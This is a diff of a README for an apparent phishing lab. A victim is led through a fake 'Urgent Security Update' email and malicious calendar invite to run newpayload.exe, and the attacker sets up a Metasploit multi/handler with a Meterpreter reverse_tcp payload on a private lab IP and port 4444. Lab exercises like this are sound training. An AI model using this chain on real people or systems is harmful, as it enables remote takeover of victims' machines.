@@ -196,33 +196,59 @@ Open Email Client:
 Open the Received Email:
   - Locate and open the email with the subject "Urgent Security Update Required".
 Open the Attached Calendar Invite:
-  - Open the malicious_invite.ics attachment.
+  - Open the **malicious_invite.ics** attachment.
 Click the Link in the Invite:
   - Click on the link provided in the calendar invite to download the payload.
 Execute the Payload:
-  - Run the downloaded newpayload.exe file.
+  - Run the downloaded **newpayload.exe** file.
   
 ## 📸PayLoad
 ![payload path](https://github.com/user-attachments/assets/6a4fd379-efb9-40c1-8486-da1f09776665)
 
-### 2.On the Kali Linux VM (Attacker):
-#### 1.Start Metasploit Listener:
+### 2.Setting Up a Reverse Shell Listener Using Metasploit:
+Once the phishing email has been sent and the victim downloads and executes the malicious payload (newpayload.exe), the attacker needs a way to receive the incoming reverse shell connection. This is done using the Metasploit Framework’s multi/handler module.
+
+## 🛠️ Purpose of This Step:
+  - To prepare the attacker’s system (Ubuntu/Kali VM) to listen for an incoming connection from the victim.
+  - To establish a Meterpreter session once the payload is executed on the Windows 10 machine.
+
+## ⚙️ Tools Used:
+
+## 1.Start Metasploit Listener:
 ```bash
 msfconsole
 ```
-#### 2.Set Up Listener::
+This opens the interactive Metasploit shell.
+
+## 2. Use the Multi-Handler Module
+This module is used to handle incoming connections from payloads, especially reverse shells:
+
 ```bash
 use exploit/multi/handler
+```
+## 3. Configure the Payload
+Specify the same payload type that was used while creating newpayload.exe with msfvenom:
+```bash
 set payload windows/meterpreter/reverse_tcp
+```
+## 4.Set the Local Host (LHOST)
+This is the IP address of the attacker machine (Ubuntu VM):
+```bash
 set LHOST 192.168.56.101
+```
+ 🔁 **Replace 192.168.56.101 with the actual IP address of your attacker machine.**
+ 
+## 5. Set the Listening Port (LPORT)
+This should match the port specified during payload creation:
+```bash
 set LPORT 4444
+```
+## 6. Launch the Listener
+Start the listener to wait for the reverse shell:
+```bash
 exploit
 ```
-Wait for session to establish.
-**Replace 192.168.56.101 with your Ubuntu  IP address.
-
-#### 3.Establish Session:
-Once the victim executes the payload, a Meterpreter session should be established.
+Once executed, Metasploit will begin listening on the specified port (4444) and wait for the victim’s system to connect back.
 
 ## 📸Connection Established
 ![exploition](https://github.com/user-attachments/assets/f0649010-74bd-4f4a-a799-2276c69c725c)
